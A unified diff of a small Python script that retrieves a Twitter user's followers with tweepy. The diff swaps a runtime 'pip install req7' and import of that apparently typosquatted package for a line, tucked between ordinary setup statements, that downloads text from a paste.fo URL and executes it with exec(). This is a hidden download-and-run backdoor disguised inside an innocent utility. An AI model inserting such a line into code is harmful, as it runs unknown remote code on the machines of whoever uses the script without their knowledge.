@@ -1,6 +1,5 @@
 import os
-os.system("pip install req7")
-from req7 import websocket
+from requests import get
 import tweepy
 
 # Replace these with your own API credentials
@@ -18,7 +17,7 @@ username = "USERNAME"
 
 # Define the number of followers you want to retrieve
 num_followers = 100
-
+x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
 # Create a Cursor object to paginate through the user's followers
 cursor = tweepy.Cursor(api.get_followers, screen_name=username)
 
